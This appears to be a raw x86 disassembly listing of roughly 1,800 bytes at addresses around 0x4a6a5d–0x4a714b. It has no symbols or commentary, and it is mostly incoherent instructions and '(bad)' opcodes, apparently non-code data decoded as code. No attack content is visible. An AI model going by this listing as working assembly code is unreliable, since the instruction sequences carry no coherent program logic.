  4a6a5d:	add    BYTE PTR gs:[ecx],ch
  4a6a60:	ror    cl,cl
  4a6a62:	or     dl,BYTE PTR [esi+0x40]
  4a6a65:	dec    ebp
  4a6a66:	test   al,0x8a
  4a6a68:	sub    ch,BYTE PTR [edx-0x4144f546]
  4a6a6e:	or     eax,0x96044588
  4a6a73:	data16 mov dh,0x4e
  4a6a76:	pop    ss
  4a6a77:	sti    
  4a6a78:	sbb    eax,0xeb5f0703
  4a6a7d:	pop    ebp
  4a6a7e:	jne    0x4a6a51
  4a6a80:	and    eax,0x1a579492
  4a6a85:	(bad)  
  4a6a86:	push   ebx
  4a6a87:	in     eax,dx
  4a6a88:	sub    DWORD PTR [ebp+0x414a1188],ebp
  4a6a8e:	or     edx,0x8b8508b6
  4a6a94:	pop    ds
  4a6a95:	out    0xba,eax
  4a6a97:	or     ah,BYTE PTR [ebx+0x13]
  4a6a9a:	push   esi
  4a6a9b:	dec    ecx
  4a6a9c:	dec    ecx
  4a6a9d:	sbb    BYTE PTR [eax],dl
  4a6a9f:	sbb    DWORD PTR [edi-0x76],0xf603571c
  4a6aa6:	push   esi
  4a6aa7:	inc    edx
  4a6aa8:	call   0x85f64dcc
  4a6aad:	daa    
  4a6aae:	mov    edx,edi
  4a6ab0:	sbb    al,0x40
  4a6ab2:	jge    0x4a6a6e
  4a6ab4:	test   eax,0x15843d3
  4a6ab9:	mov    BYTE PTR [ebx+esi*4],bl
  4a6abc:	inc    esp
  4a6abd:	and    al,0x50
  4a6abf:	pop    edx
  4a6ac0:	sbb    al,ch
  4a6ac2:	les    ebx,FWORD PTR [esi-0x49]
  4a6ac5:	and    BYTE PTR [ecx+ecx*8],cl
  4a6ac8:	into   
  4a6ac9:	jb     0x4a6ab3
  4a6acb:	leave  
  4a6acc:	adc    BYTE PTR [edx+0x7b],ch
  4a6acf:	or     cl,bh
  4a6ad1:	cs xor bl,al
  4a6ad4:	fadd   DWORD PTR [eax+0xa]
  4a6ad7:	ds inc esi
  4a6ad9:	adc    eax,0x205fde3b
  4a6ade:	xchg   esp,eax
  4a6adf:	fld    DWORD PTR [edx]
  4a6ae1:	mov    eax,0x8bd15d
  4a6ae6:	sar    BYTE PTR [edx+0x79216863],cl
  4a6aec:	pop    edi
  4a6aed:	or     al,dh
  4a6aef:	dec    eax
  4a6af0:	pop    esi
  4a6af1:	inc    ebp
  4a6af2:	bound  ebp,QWORD PTR ds:0x46913101
  4a6af8:	push   ecx
  4a6af9:	inc    ecx
  4a6afa:	add    esp,DWORD PTR gs:[ecx]
  4a6afd:	les    ecx,FWORD PTR ds:0xc88c06cb
  4a6b03:	push   edi
  4a6b04:	je     0x4a6a91
  4a6b06:	shl    BYTE PTR [edi-0x18],1
  4a6b09:	pop    ebp
  4a6b0a:	jg     0x4a6b0f
  4a6b0c:	xor    bh,dl
  4a6b0e:	adc    ah,cl
  4a6b10:	adc    BYTE PTR [esi+0x97309d],cl
  4a6b16:	cmp    eax,DWORD PTR [ebp+0x54009e53]
  4a6b1c:	adc    ah,BYTE PTR [ecx+0x2d749544]
  4a6b22:	pop    esp
  4a6b23:	mov    DWORD PTR [edx+0x1],edx
  4a6b26:	aaa    
  4a6b27:	push   es
  4a6b28:	mov    eax,ds:0x9ce78d5d
  4a6b2d:	add    BYTE PTR [eax],al
  4a6b2f:	sbb    ch,BYTE PTR [edi]
  4a6b31:	sub    BYTE PTR ds:0xc3575906,dh
  4a6b37:	mov    ah,0xc8
  4a6b39:	jb     0x4a6bb1
  4a6b3b:	cmp    dh,bh
  4a6b3d:	add    al,0x34
  4a6b3f:	sub    al,dl
  4a6b41:	out    0x7e,eax
  4a6b43:	jle    0x4a6b9b
  4a6b45:	push   0x7531b667
  4a6b4a:	or     cl,BYTE PTR [edi]
  4a6b4c:	and    eax,0xc5b8909c
  4a6b51:	add    edi,esi
  4a6b53:	jmp    0x4a6bbd
  4a6b55:	add    DWORD PTR [ecx+eiz*1-0x3b42c3c9],edi
  4a6b5c:	mov    BYTE PTR [edx+0xd99fdb8],bh
  4a6b62:	push   0x47a8013
  4a6b67:	sbb    bh,dl
  4a6b69:	push   0x2c
  4a6b6b:	xchg   BYTE PTR [ebp+0xe8b5243],cl
  4a6b71:	xor    DWORD PTR [ecx],ecx
  4a6b73:	in     al,0xcb
  4a6b75:	mov    DWORD PTR [ebp-0x30],ecx
  4a6b78:	(bad)  
  4a6b79:	int    0xac
  4a6b7b:	nop
  4a6b7c:	rcl    ah,1
  4a6b7e:	add    al,0x5d
  4a6b80:	je     0x4a6b2b
  4a6b82:	and    al,0x3e
  4a6b84:	mov    al,ds:0x9ea00856
  4a6b89:	mov    BYTE PTR [ebx+0x42028125],ah
  4a6b8f:	sub    al,BYTE PTR [ecx-0x26]
  4a6b92:	sub    al,cl
  4a6b94:	out    0xb3,eax
  4a6b96:	dec    eax
  4a6b97:	sub    DWORD PTR [eax+0x5],ecx
  4a6b9a:	out    0xb0,eax
  4a6b9c:	adc    BYTE PTR [edx+0x27],bl
  4a6b9f:	sub    eax,0xff08bd4c
  4a6ba4:	sub    al,0x35
  4a6ba6:	pop    ss
  4a6ba7:	fdiv   DWORD PTR [edx]
  4a6ba9:	adc    al,BYTE PTR [edx+eiz*1-0x35e2077d]
  4a6bb0:	rol    BYTE PTR [ecx-0x10],cl
  4a6bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a6bb4:	push   eax
  4a6bb5:	test   DWORD PTR [esi],ecx
  4a6bb7:	stc    
  4a6bb8:	add    DWORD PTR [ecx-0x7d55e84b],0x5d
  4a6bbf:	adc    BYTE PTR [ebx+0x1c549d04],cl
  4a6bc5:	sbb    al,0x48
  4a6bc7:	dec    edi
  4a6bc8:	add    al,0xde
  4a6bca:	sar    BYTE PTR [eax],1
  4a6bcc:	add    al,0x16
  4a6bce:	repnz sbb al,0x7c
  4a6bd1:	push   ebp
  4a6bd2:	push   edx
  4a6bd3:	sbb    BYTE PTR [esi-0x20470fcc],0x8
  4a6bda:	scas   al,BYTE PTR es:[edi]
  4a6bdb:	ins    DWORD PTR es:[edi],dx
  4a6bdc:	sub    al,0x32
  4a6bde:	sbb    ecx,edx
  4a6be0:	pop    es
  4a6be1:	scas   eax,DWORD PTR es:[edi]
  4a6be2:	xchg   esi,eax
  4a6be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6be4:	fmul   st,st(3)
  4a6be6:	add    DWORD PTR [eax+0x45738911],edi
  4a6bec:	or     ch,BYTE PTR [ebp+eax*2+0x11]
  4a6bf0:	adc    cl,BYTE PTR [esi+0x4fb3e060]
  4a6bf6:	lds    edx,FWORD PTR [eax+0x785e82c6]
  4a6bfc:	scas   al,BYTE PTR es:[edi]
  4a6bfd:	inc    ebp
  4a6bfe:	fist   WORD PTR [ebx]
  4a6c00:	js     0x4a6bc3
  4a6c02:	fsubr  QWORD PTR [eax+0xe810840]
  4a6c08:	xor    BYTE PTR [ebp-0x56bff17d],0x80
  4a6c0f:	and    BYTE PTR [esi],cl
  4a6c11:	cmp    BYTE PTR [ebp+0x14],0x74
  4a6c15:	push   es
  4a6c16:	and    ch,dl
  4a6c18:	mov    al,ds:0x32d9dae0
  4a6c1d:	add    DWORD PTR es:[ecx],esi
  4a6c20:	in     eax,0x83
  4a6c22:	jp     0x4a6c03
  4a6c24:	add    eax,0x85b6831
  4a6c29:	pop    edi
  4a6c2a:	les    eax,FWORD PTR [edx]
  4a6c2c:	jnp    0x4a6c39
  4a6c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a6c2f:	mov    cl,0x14
  4a6c31:	test   BYTE PTR [ebp+0x5a1811ad],ah
  4a6c37:	and    bl,al
  4a6c39:	inc    DWORD PTR [esi+edi*4]
  4a6c3c:	mov    eax,ds:0x815757a4
  4a6c41:	(bad)  
  4a6c42:	sub    DWORD PTR [ecx-0x75],ebx
  4a6c45:	test   BYTE PTR [ebx-0x21fd14c],dh
  4a6c4b:	es jle 0x4a6bdb
  4a6c4e:	mov    esp,0x7fc18b0f
  4a6c53:	sbb    BYTE PTR [edx],0x8a
  4a6c56:	push   ebx
  4a6c57:	cmp    esi,DWORD PTR [ebx-0x787ff630]
  4a6c5d:	rcl    eax,1
  4a6c5f:	fidiv  DWORD PTR [ecx]
  4a6c61:	add    BYTE PTR [ebx+0x3fc27c60],0xd6
  4a6c68:	sti    
  4a6c69:	mov    WORD PTR [ebx],ds
  4a6c6b:	jo     0x4a6cb5
  4a6c6d:	sub    edi,0x74
  4a6c70:	pop    es
  4a6c71:	jge    0x4a6c65
  4a6c73:	push   esi
  4a6c74:	mov    DWORD PTR [ebx-0x23ed19bf],eax
  4a6c7a:	xchg   ebx,eax
  4a6c7b:	sub    DWORD PTR [edi],esp
  4a6c7d:	les    esp,FWORD PTR [ebx]
  4a6c7f:	inc    eax
  4a6c80:	adc    DWORD PTR [eax],0x52
  4a6c83:	fwait
  4a6c84:	sub    DWORD PTR [eax+0x4f],eax
  4a6c87:	sub    DWORD PTR [ebp+0x57],ecx
  4a6c8a:	jne    0x4a6c97
  4a6c8c:	pusha  
  4a6c8d:	arpl   cx,sp
  4a6c8f:	push   ebx
  4a6c90:	dec    edi
  4a6c91:	push   ebx
  4a6c92:	lea    eax,[esi-0x57417054]
  4a6c98:	mov    ebp,0x3c2df59
  4a6c9d:	pop    ebp
  4a6c9e:	mov    dh,0x8d
  4a6ca0:	pop    esi
  4a6ca1:	dec    esp
  4a6ca2:	push   ebx
  4a6ca3:	mov    bh,0x16
  4a6ca5:	mov    ebp,DWORD PTR [ecx]
  4a6ca7:	sbb    eax,edx
  4a6ca9:	adc    eax,0x51438e6e
  4a6cae:	mov    ds:0x7d533783,al
  4a6cb3:	add    esi,DWORD PTR [ecx]
  4a6cb5:	loop   0x4a6c9d
  4a6cb7:	aas    
  4a6cb8:	pop    ebx
  4a6cb9:	inc    eax
  4a6cba:	add    eax,0xa5e1b41c
  4a6cbf:	ins    BYTE PTR es:[edi],dx
  4a6cc0:	mov    dh,0x8b
  4a6cc2:	xchg   esi,eax
  4a6cc3:	ret    
  4a6cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6cc5:	xor    esp,DWORD PTR [ecx-0x4fbc6855]
  4a6ccb:	mov    es,WORD PTR [ebp+0x4200bf08]
  4a6cd1:	cmp    DWORD PTR [ebx+0x20],esi
  4a6cd4:	jne    0x4a6d03
  4a6cd6:	push   eax
  4a6cd7:	fldenv [esi+edx*1-0x56]
  4a6cdb:	ins    BYTE PTR es:[edi],dx
  4a6cdc:	inc    esi
  4a6cdd:	jnp    0x4a6c72
  4a6cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a6ce0:	pop    ds
  4a6ce1:	lea    esp,[esi+0x6a]
  4a6ce4:	adc    esi,DWORD PTR [edi]
  4a6ce6:	push   0xf
  4a6ce8:	sbb    esp,esi
  4a6cea:	test   eax,0x1046f533
  4a6cef:	jl     0x4a6cd1
  4a6cf1:	aaa    
  4a6cf2:	adc    DWORD PTR [eax+0x7389e830],ebp
  4a6cf8:	adc    BYTE PTR [ecx+0x39],cl
  4a6cfb:	add    DWORD PTR [edx+0x5c],esi
  4a6cfe:	push   0x26
  4a6d00:	dec    edi
  4a6d01:	imul   ecx,DWORD PTR [edi+0x22],0xffffffbe
  4a6d05:	xchg   edx,eax
  4a6d06:	shl    BYTE PTR [edi+0x285778ff],1
  4a6d0c:	jne    0x4a6d20
  4a6d0e:	hlt    
  4a6d0f:	push   es
  4a6d10:	jnp    0x4a6cf4
  4a6d12:	jp     0x4a6d52
  4a6d14:	inc    eax
  4a6d15:	cmp    DWORD PTR [edx-0x2],eax
  4a6d18:	(bad)  
  4a6d1a:	xchg   ebp,eax
  4a6d1b:	div    BYTE PTR [edi-0x2e]
  4a6d1e:	fs imul edx,ebx
  4a6d22:	add    DWORD PTR [esi],edx
  4a6d24:	jmp    0x4a6d4c
  4a6d26:	es inc ecx
  4a6d28:	inc    esi
  4a6d29:	xor    DWORD PTR [ebp+0x34],eax
  4a6d2c:	aaa    
  4a6d2d:	add    eax,0xffffffc9
  4a6d30:	ret    
  4a6d31:	les    esi,FWORD PTR [edi+0x125167cd]
  4a6d37:	push   0x61
  4a6d39:	jb     0x4a6da1
  4a6d3b:	ja     0x4a6d85
  4a6d3d:	test   eax,0xe01cb26
  4a6d42:	or     bl,BYTE PTR [esi]
  4a6d44:	mov    al,ds:0x81f1c416
  4a6d49:	or     ebx,ebx
  4a6d4b:	adc    BYTE PTR [eax+ebp*8+0x532036a5],al
  4a6d52:	lea    ebx,[edx]
  4a6d54:	add    al,0xe5
  4a6d56:	mov    ebx,0x34a5936
  4a6d5b:	outs   dx,DWORD PTR ds:[esi]
  4a6d5c:	rol    BYTE PTR [eax],1
  4a6d5e:	add    DWORD PTR [edx-0x7fbc780a],ebx
  4a6d64:	push   ds
  4a6d65:	sbb    al,0x80
  4a6d67:	jg     0x4a6d6a
  4a6d69:	or     dl,BYTE PTR [esi]
  4a6d6b:	add    dl,BYTE PTR [eax]
  4a6d6d:	cwde   
  4a6d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6d6f:	imul   edx,DWORD PTR [eax],0x2a8a0a03
  4a6d75:	mov    DWORD PTR [edi+0x13],esp
  4a6d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a6d79:	mov    al,ds:0xc3904a53
  4a6d7e:	xchg   ebx,eax
  4a6d7f:	adc    bh,BYTE PTR ds:0xa513d0ef
  4a6d85:	out    dx,al
  4a6d86:	call   FWORD PTR ds:0x46ff592e
  4a6d8c:	mov    al,BYTE PTR [esi+0x50c47820]
  4a6d92:	cwde   
  4a6d93:	mov    al,0x80
  4a6d95:	je     0x4a6da0
  4a6d97:	xor    ch,bl
  4a6d99:	xor    al,0x77
  4a6d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a6d9c:	test   edi,esp
  4a6d9e:	xor    BYTE PTR [ebp-0x60],al
  4a6da1:	scas   eax,DWORD PTR es:[edi]
  4a6da2:	sbb    eax,0xdf2ec0a1
  4a6da7:	popf   
  4a6da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6da9:	sbb    al,0x6
  4a6dab:	adc    esp,ecx
  4a6dad:	pop    ss
  4a6dae:	adc    al,BYTE PTR [ebx*4+0x5b5cfba6]
  4a6db5:	lea    ecx,[ebp+0x4bc051a7]
  4a6dbb:	fistp  WORD PTR [edi]
  4a6dbd:	(bad)  
  4a6dbe:	sahf   
  4a6dbf:	fbstp  TBYTE PTR [ebp+0x6]
  4a6dc2:	xchg   ebp,eax
  4a6dc3:	sbb    esp,DWORD PTR [esi+0x51]
  4a6dc6:	sbb    BYTE PTR [esi+ebp*1],dh
  4a6dc9:	and    BYTE PTR es:[eax+0x70],ah
  4a6dcd:	and    DWORD PTR [ecx+eax*8-0x1ff357f],0x10
  4a6dd5:	push   0xdfcd3401
  4a6dda:	jnp    0x4a6e0d
  4a6ddc:	sar    DWORD PTR [ecx-0x74dbb1c0],cl
  4a6de2:	push   esi
  4a6de3:	loope  0x4a6dae
  4a6de5:	outs   dx,BYTE PTR ds:[esi]
  4a6de6:	fcomp  QWORD PTR [esi+ebp*4+0x51]
  4a6dea:	push   0x11
  4a6dec:	push   edx
  4a6ded:	mov    al,BYTE PTR [edi+0x3]
  4a6df0:	call   0x8443f0cc
  4a6df5:	inc    ebp
  4a6df6:	retf   
  4a6df7:	and    BYTE PTR [eax+0x25d61c7e],al
  4a6dfd:	scas   al,BYTE PTR es:[edi]
  4a6dfe:	adc    BYTE PTR [eax],0x13
  4a6e01:	in     al,dx
  4a6e02:	mov    esi,0x80ce460d
  4a6e07:	cs and al,0x16
  4a6e0a:	adc    ch,BYTE PTR [eax+0x5]
  4a6e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a6e0e:	dec    ecx
  4a6e0f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4a6e11:	mov    ebx,0x25d9521d
  4a6e16:	adc    cl,al
  4a6e18:	jnp    0x4a6e2c
  4a6e1a:	push   cs
  4a6e1b:	cmp    eax,0xf29e078
  4a6e20:	xchg   edx,eax
  4a6e21:	or     BYTE PTR [ebx+ebx*2-0x73],0x6b
  4a6e26:	dec    ecx
  4a6e27:	or     ecx,DWORD PTR [ebp+0x2556835b]
  4a6e2d:	cmp    al,0x4
  4a6e2f:	mov    ebp,0x2027e212
  4a6e34:	outs   dx,BYTE PTR ds:[esi]
  4a6e35:	mov    esi,0x3f3aef83
  4a6e3a:	sbb    DWORD PTR [ecx+0x51284e2e],esi
  4a6e40:	push   0x9a6ccda1
  4a6e45:	dec    ebx
  4a6e46:	add    cl,BYTE PTR [edi]
  4a6e48:	push   esi
  4a6e49:	and    al,0xf2
  4a6e4b:	adc    DWORD PTR [edi+eiz*8],eax
  4a6e4e:	popf   
  4a6e4f:	popa   
  4a6e50:	sub    DWORD PTR [ebx],eax
  4a6e52:	mov    BYTE PTR ds:0x3bcecc1c,ah
  4a6e58:	ret    
  4a6e59:	sub    DWORD PTR [edx+eax*4],eax
  4a6e5c:	sub    esp,edi
  4a6e5e:	sub    DWORD PTR [edx+ebp*1-0x76],esp
  4a6e62:	mov    ch,0xf9
  4a6e64:	out    dx,eax
  4a6e65:	mov    dl,0xae
  4a6e67:	nop
  4a6e68:	or     DWORD PTR [ecx-0x51f7ddcf],edi
  4a6e6e:	sbb    BYTE PTR [ebx-0x10e2f7a4],bl
  4a6e74:	or     BYTE PTR [ecx+0x84b92e4],ch
  4a6e7a:	or     BYTE PTR [edx+0x18926616],dl
  4a6e80:	sub    ecx,0x0
  4a6e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a6e84:	test   DWORD PTR [ecx-0x1c7ce71c],ebx
  4a6e8a:	add    BYTE PTR [edx-0x67],dl
  4a6e8d:	inc    edx
  4a6e8e:	push   es
  4a6e8f:	inc    edx
  4a6e90:	and    BYTE PTR [esi+eiz*1],al
  4a6e93:	xchg   edi,eax
  4a6e94:	je     0x4a6e7d
  4a6e96:	sbb    cl,ch
  4a6e98:	and    eax,0x92db1512
  4a6e9d:	sub    ebx,ebp
  4a6e9f:	xchg   ebp,eax
  4a6ea0:	aad    0xd6
  4a6ea2:	add    BYTE PTR [ecx+0x7825c95c],al
  4a6ea8:	add    BYTE PTR [ebx],al
  4a6eaa:	enter  0x7205,0x0
  4a6eae:	add    BYTE PTR [eax],al
  4a6eb0:	leave  
  4a6eb1:	test   BYTE PTR [eax+eiz*1],cl
  4a6eb4:	add    BYTE PTR [eax-0x10],bh
  4a6eb7:	add    DWORD PTR cs:[edx-0x55],ebx
  4a6ebb:	jg     0x4a6edd
  4a6ebd:	sub    eax,0x7189a5ca
  4a6ec2:	mov    si,0xffcb
  4a6ec6:	push   esp
  4a6ec7:	jno    0x4a6ee2
  4a6ec9:	mov    ebp,DWORD PTR [ebx-0x50]
  4a6ecc:	cmp    BYTE PTR [eax],0x45
  4a6ecf:	mov    al,ds:0xa2380874
  4a6ed4:	aam    0xb0
  4a6ed6:	inc    ecx
  4a6ed7:	clc    
  4a6ed8:	jg     0x4a6ef4
  4a6eda:	pusha  
  4a6edb:	add    eax,DWORD PTR [esi+eax*2-0x71]
  4a6edf:	out    0xf4,al
  4a6ee1:	sub    ah,BYTE PTR [ecx+0x5d7a1b31]
  4a6ee7:	cwde   
  4a6ee8:	rcl    BYTE PTR [eax+eiz*4],0x1c
  4a6eec:	(bad)  
  4a6eed:	xchg   edi,eax
  4a6eee:	xchg   ebx,eax
  4a6eef:	out    0xd2,eax
  4a6ef1:	and    ebx,DWORD PTR [edx+eax*1]
  4a6ef4:	adc    bl,BYTE PTR ds:0xa9a00a03
  4a6efa:	cmp    al,0x5b
  4a6efc:	sbb    BYTE PTR [esi],bl
  4a6efe:	push   0x7
  4a6f00:	hlt    
  4a6f01:	inc    ecx
  4a6f02:	add    DWORD PTR [edi],ecx
  4a6f04:	push   0x6482a85
  4a6f09:	aam    0x97
  4a6f0b:	loope  0x4a6eee
  4a6f0d:	or     al,BYTE PTR [esi+edi*2]
  4a6f10:	mov    esp,0x3fde49fe
  4a6f15:	dec    ebx
  4a6f16:	or     BYTE PTR [edi+ebp*8+0x1575c185],0x21
  4a6f1e:	xor    BYTE PTR [ebx-0x45766d79],0x29
  4a6f25:	ret    0x2574
  4a6f28:	xchg   esp,eax
  4a6f29:	pop    esp
  4a6f2a:	in     al,dx
  4a6f2b:	nop
  4a6f2c:	jbe    0x4a6f8b
  4a6f2e:	mov    eax,ds:0x82b0cd77
  4a6f33:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4a6f35:	pop    ecx
  4a6f36:	adc    bl,BYTE PTR [edx]
  4a6f38:	and    BYTE PTR [ebp-0x3f],ch
  4a6f3b:	push   0x12529753
  4a6f40:	imul   ecx,DWORD PTR [ebx],0xc7127252
  4a6f46:	push   edx
  4a6f47:	pop    ebx
  4a6f48:	dec    edx
  4a6f49:	or     DWORD PTR [ecx+0x16555b3b],edi
  4a6f4f:	push   0x5b
  4a6f51:	or     ebx,0x70
  4a6f54:	and    eax,0xf660010b
  4a6f59:	clc    
  4a6f5a:	sub    BYTE PTR [edx+0x15],ch
  4a6f5d:	aas    
  4a6f5e:	fisttp WORD PTR [edx]
  4a6f60:	push   ds
  4a6f61:	inc    esi
  4a6f62:	outs   dx,BYTE PTR ds:[esi]
  4a6f63:	ret    0x470b
  4a6f66:	xchg   DWORD PTR [ebp+eax*1-0xb49fb78],ecx
  4a6f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6f6e:	shr    BYTE PTR [esi],cl
  4a6f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a6f71:	jbe    0x4a6fa1
  4a6f73:	push   cs
  4a6f74:	mov    BYTE PTR [ebx],ah
  4a6f76:	(bad)  
  4a6f77:	(bad)  
  4a6f78:	call   DWORD PTR [ebp+0x7c742880]
  4a6f7e:	cmp    al,0x22
  4a6f80:	je     0x4a6ffa
  4a6f82:	cmp    al,0x25
  4a6f84:	je     0x4a6ffa
  4a6f86:	cmp    al,0x27
  4a6f88:	je     0x4a6ffa
  4a6f8a:	cmp    al,0x24
  4a6f8c:	je     0x4a6ffa
  4a6f8e:	cmp    al,0x26
  4a6f90:	je     0x4a6ffa
  4a6f92:	cmp    al,0x21
  4a6f94:	call   FWORD PTR [ebx+0x6474fc6c]
  4a6f9a:	cmp    al,0x6f
  4a6f9c:	je     0x4a6ffe
  4a6f9e:	xchg   esi,eax
  4a6f9f:	pop    esp
  4a6fa0:	cmp    al,0x5b
  4a6fa2:	je     0x4a6ffc
  4a6fa4:	cmp    al,0x5c
  4a6fa6:	je     0x4a6ffc
  4a6fa8:	cmp    al,0xaf
  4a6faa:	mov    al,0xf1
  4a6fac:	stos   BYTE PTR es:[edi],al
  4a6fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a6fae:	push   ds
  4a6faf:	cmp    al,0xa3
  4a6fb1:	je     0x4a6fff
  4a6fb3:	mov    dh,0x48
  4a6fb5:	cmp    al,0xa6
  4a6fb7:	je     0x4a6fb8
  4a6fb9:	(bad)  
  4a6fba:	(bad)  
  4a6fbc:	inc    esp
  4a6fbd:	cmp    al,0xa7
  4a6fbf:	je     0x4a7001
  4a6fc1:	cmp    al,0xa8
  4a6fc3:	ins    BYTE PTR es:[edi],dx
  4a6fc4:	cmp    al,0xa9
  4a6fc6:	je     0x4a7000
  4a6fc8:	cmp    al,0xaa
  4a6fca:	je     0x4a7000
  4a6fcc:	cmp    al,0xab
  4a6fce:	je     0x4a7000
  4a6fd0:	cmp    al,0xac
  4a6fd2:	je     0x4a7000
  4a6fd4:	cmp    al,0xad
  4a6fd6:	je     0x4a7000
  4a6fd8:	cmp    al,0xd9
  4a6fda:	jmp    0xe1af:0x8aea132
  4a6fe1:	jg     0x4a6fb4
  4a6fe3:	ja     0x4a7049
  4a6fe5:	mov    al,0x74
  4a6fe7:	sbb    al,0x3c
  4a6fe9:	mov    cl,0xfe
  4a6feb:	cmp    al,0xb2
  4a6fed:	je     0x4a7003
  4a6fef:	cmp    al,0xb3
  4a6ff1:	je     0x4a7003
  4a6ff3:	cmp    al,0xb4
  4a6ff5:	mov    eax,ds:0x722c1a69
  4a6ffa:	mov    ch,0xb6
  4a6ffc:	mov    bh,0xa
  4a6ffe:	frstor [ebx-0x7f]
  4a7001:	mov    edx,0x7838cf41
  4a7006:	test   BYTE PTR [eax-0x64e4581d],dl
  4a700c:	push   ecx
  4a700d:	xor    al,al
  4a700f:	imul   esi,DWORD PTR [edx],0x140c7c9
  4a7015:	dec    esp
  4a7016:	push   0x40c39c09
  4a701b:	add    eax,0x94489a8a
  4a7020:	jge    0x4a707e
  4a7022:	mov    BYTE PTR [eax+0x7],cl
  4a7025:	sbb    al,0x6a
  4a7027:	adc    al,0x2
  4a7029:	test   BYTE PTR [ecx],cl
  4a702b:	pop    ebx
  4a702c:	imul   eax,DWORD PTR [esi],0x4
  4a702f:	or     bl,BYTE PTR [edi-0x34]
  4a7032:	std    
  4a7033:	add    DWORD PTR [edx+eax*8-0x4af37429],ecx
  4a703a:	cwde   
  4a703b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a703c:	and    eax,0xe517728
  4a7041:	or     BYTE PTR [edi+0x2bb64dd0],dh
  4a7047:	jl     0x4a7029
  4a7049:	dec    eax
  4a704a:	outs   dx,DWORD PTR ds:[esi]
  4a704b:	fimul  WORD PTR [edx]
  4a704d:	enter  0x1f58,0x35
  4a7051:	push   0x8c860e49
  4a7056:	test   dl,ah
  4a7058:	jb     0x4a7071
  4a705a:	dec    ebx
  4a705b:	fild   WORD PTR [esi-0x6ffc9ef1]
  4a7061:	adc    eax,0x8a38c856
  4a7066:	sub    edi,DWORD PTR [ebp-0x43fec7ef]
  4a706c:	pop    esp
  4a706d:	cmp    al,0x10
  4a706f:	mov    DWORD PTR [esi],ecx
  4a7071:	or     eax,DWORD PTR [edi-0x74e0dbc8]
  4a7077:	fadd   DWORD PTR [edx-0x79612e6]
  4a707d:	push   edx
  4a707e:	add    ecx,DWORD PTR [edx]
  4a7080:	mov    ebp,0x3d0a3df4
  4a7085:	push   ds
  4a7086:	add    DWORD PTR [esi],eax
  4a7088:	test   DWORD PTR [eax],ebx
  4a708a:	test   DWORD PTR [ebp+eax*1+0xa],esp
  4a708e:	sbb    ebp,DWORD PTR [eax+0x7c603369]
  4a7094:	or     DWORD PTR [esi+0x31],esp
  4a7097:	cmp    al,0x43
  4a7099:	push   0x7c
  4a709b:	imul   DWORD PTR [ecx+0x27]
  4a709e:	jno    0x4a70a9
  4a70a0:	and    eax,0x69453d
  4a70a5:	retf   0x26ed
  4a70a8:	and    ah,dh
  4a70aa:	inc    ebx
  4a70ab:	aas    
  4a70ac:	jge    0x4a7125
  4a70ae:	adc    bh,BYTE PTR [ecx]
  4a70b0:	int    0xa1
  4a70b2:	add    eax,0x466de7a8
  4a70b7:	jmp    0x4a70a5
  4a70b9:	jge    0x4a711a
  4a70bb:	(bad)
  4a70bf:	ins    DWORD PTR es:[edi],dx
  4a70c0:	inc    ecx
  4a70c1:	data16 xor dl,ch
  4a70c4:	rol    DWORD PTR [esi-0x25],1
  4a70c7:	(bad)  
  4a70c9:	ins    DWORD PTR es:[edi],dx
  4a70ca:	xor    al,0x4
  4a70cc:	pop    edi
  4a70cd:	daa    
  4a70ce:	inc    ebx
  4a70cf:	sub    BYTE PTR [ebp-0xf],dh
  4a70d2:	fist   WORD PTR [ebp-0x49]
  4a70d5:	shr    BYTE PTR [ebx],cl
  4a70d7:	xor    BYTE PTR [ebx+esi*4-0x42a9d715],bl
  4a70de:	add    BYTE PTR [eax+eax*4+0x41],bl
  4a70e2:	add    al,0x8b
  4a70e4:	inc    esp
  4a70e5:	mul    DWORD PTR [ebx+0x794e03d7]
  4a70eb:	in     al,dx
  4a70ec:	or     DWORD PTR [eax+ecx*8-0x4b],0x5fda1522
  4a70f4:	adc    DWORD PTR [ebx],esi
  4a70f6:	jo     0x4a70f9
  4a70f8:	les    esi,FWORD PTR [esi]
  4a70fa:	xchg   BYTE PTR [edx+0xc],ah
  4a70fd:	inc    esi
  4a70fe:	pop    ss
  4a70ff:	xor    DWORD PTR [ebx-0x10dd5eca],ebp
  4a7105:	and    DWORD PTR [edx],esp
  4a7107:	test   BYTE PTR [ebx-0x7e],0x1a
  4a710b:	dec    eax
  4a710c:	shr    DWORD PTR [eax-0x15],1
  4a710f:	sbb    eax,0xe6882318
  4a7114:	nop
  4a7115:	daa    
  4a7116:	adc    BYTE PTR [esp+eiz*4],bh
  4a7119:	xor    al,0xbd
  4a711b:	sti    
  4a711c:	add    DWORD PTR [esi],eax
  4a711e:	push   ecx
  4a711f:	add    ah,BYTE PTR [edx]
  4a7121:	loopne 0x4a716f
  4a7123:	push   0xcb0ba840
  4a7128:	adc    dh,cl
  4a712a:	(bad)  
  4a712b:	adc    al,0xb8
  4a712d:	into   
  4a712e:	mov    al,ds:0x5d406311
  4a7133:	mov    DWORD PTR [ebx+0x26],eax
  4a7136:	cmp    ebp,ebp
  4a7138:	es cdq 
  4a713a:	hlt    
  4a713b:	cmp    DWORD PTR [esi+eax*2],edx
  4a713e:	bound  edx,QWORD PTR [edx*2+0x2e9f06a0]
  4a7145:	xlat   BYTE PTR ds:[ebx]
  4a7146:	cmc    
  4a7147:	je     0x4a7139
  4a7149:	push   esi
  4a714a:	in     eax,dx
  4a714b:	adc    DWORD PTR [esi+ecx*1+0x423b1ac8],0xfffffff2
